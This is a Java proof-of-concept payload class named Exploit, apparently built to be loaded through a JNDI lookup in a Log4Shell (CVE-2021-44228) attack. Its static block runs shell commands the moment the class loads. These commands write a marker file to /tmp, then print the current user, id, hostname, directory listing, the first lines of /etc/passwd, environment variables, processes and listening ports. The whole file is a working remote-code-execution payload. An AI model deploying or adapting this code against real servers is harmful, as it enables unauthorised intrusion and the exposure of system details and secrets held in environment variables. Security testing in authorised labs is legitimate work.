import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {

    static {
        try {
            exec("echo 'LOG4SHELL RCE' > /tmp/pwned.txt");
            exec("date >> /tmp/pwned.txt");
            exec("whoami >> /tmp/pwned.txt");
            exec("id >> /tmp/pwned.txt");

            System.out.println("\n[LOG4SHELL] Remote Code Execution achieved\n");

            System.out.println("--- System Info ---");
            System.out.println("OS:   " + System.getProperty("os.name"));
            System.out.println("Java: " + System.getProperty("java.version"));
            System.out.println("User: " + System.getProperty("user.name"));
            System.out.println("Dir:  " + System.getProperty("user.dir"));

            System.out.println("\n--- Command Execution ---");
            run("whoami");
            run("id");
            run("hostname");
            run("pwd");
            run("ls -la");
            run("cat /etc/passwd | head -5");
            run("env | head -10");
            run("ps aux | head -5");
            run("netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null || echo 'netstat unavailable'");

            System.out.println("\n--- Proof of Exploitation ---");
            run("cat /tmp/pwned.txt");

        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    private static void exec(String cmd) {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd}).waitFor();
        } catch (Exception ignored) {}
    }

    private static void run(String cmd) {
        System.out.println("\n$ " + cmd);
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                System.out.println(line);
            }
            p.waitFor();
        } catch (Exception e) {
            System.out.println("Failed: " + e.getMessage());
        }
    }

    @Override
    public Object getObjectInstance(Object o, Name n, Context c, Hashtable<?, ?> h) {
        return null;
    }
}